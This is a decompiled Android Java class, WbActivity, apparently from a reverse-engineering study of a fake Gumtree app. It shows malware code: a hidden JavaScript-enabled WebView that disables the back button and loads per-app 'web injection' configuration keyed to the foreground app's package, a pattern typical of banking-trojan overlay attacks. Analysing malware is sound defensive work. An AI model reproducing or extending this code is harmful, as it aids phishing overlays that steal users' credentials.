package com.gumsis.wb;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.view.ViewGroup.LayoutParams;
import android.webkit.WebSettings;
import android.webkit.WebView;
import com.gumsis.Realtalk;
import com.gumsis.base.BaseActivity;
import com.gumsis.checktls.Print;
import com.gumsis.checktls.ScrTls;

public class WbActivity
  extends BaseActivity
{
  private String mCurrentPackage;
  private String mUrl;
  
  private void getBundle()
  {
    Intent localIntent = getIntent();
    if (localIntent != null)
    {
      this.mUrl = localIntent.getStringExtra("url");
      this.mCurrentPackage = localIntent.getStringExtra("currentPackage");
    }
  }
  
  private WebView getWebView()
  {
    WebView localWebView = new WebView(this);
    localWebView.setLayoutParams(new ViewGroup.LayoutParams(-1, -1));
    return localWebView;
  }
  
  @SuppressLint({"SetJavaScriptEnabled"})
  private void initWebView(WebView paramWebView)
  {
    paramWebView.setVisibility(4);
    paramWebView.getSettings().setJavaScriptEnabled(true);
    paramWebView.getSettings().setCacheMode(1);
    paramWebView.setVerticalScrollBarEnabled(false);
    paramWebView.setHorizontalScrollBarEnabled(false);
    paramWebView.getSettings().setUseWideViewPort(false);
    paramWebView.setWebViewClient(new CustomWVClient(new CustomWVClient.OnWVClicentCallback()
    {
      public void onRedirect(WebView paramAnonymousWebView, String paramAnonymousString)
      {
        if (WbActivity.this.mCurrentPackage != null) {}
        try
        {
          paramAnonymousWebView = WITools.changeWEBInjJSONbyPkg(WbActivity.this.mCurrentPackage);
          if (paramAnonymousWebView != null)
          {
            Realtalk.setWriteInjJSON(WbActivity.this, paramAnonymousWebView);
            Realtalk.injWI = WITools.parseWEBInjJson(Realtalk.getWriteInjJSON(WbActivity.this));
          }
        }
        catch (Exception paramAnonymousWebView)
        {
          for (;;)
          {
            Print.e(paramAnonymousWebView.toString());
          }
        }
        WbActivity.this.finishActivity();
      }
    }));
    paramWebView.setWebChromeClient(new CustomWVChromeClient());
    paramWebView.loadUrl(this.mUrl + "?" + "ID=" + Realtalk.getPsuedoID(this));
  }
  
  public void onBackPressed() {}
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    ScrTls.scrOn(this);
    getBundle();
    paramBundle = getWebView();
    setContentView(paramBundle);
    initWebView(paramBundle);
    if (Build.VERSION.SDK_INT >= 19) {
      WebView.setWebContentsDebuggingEnabled(true);
    }
  }
  
  protected void onDestroy()
  {
    super.onDestroy();
    ScrTls.scrOff(this);
  }
  
  protected void onPause()
  {
    super.onPause();
    finishActivity();
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/wb/WbActivity.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */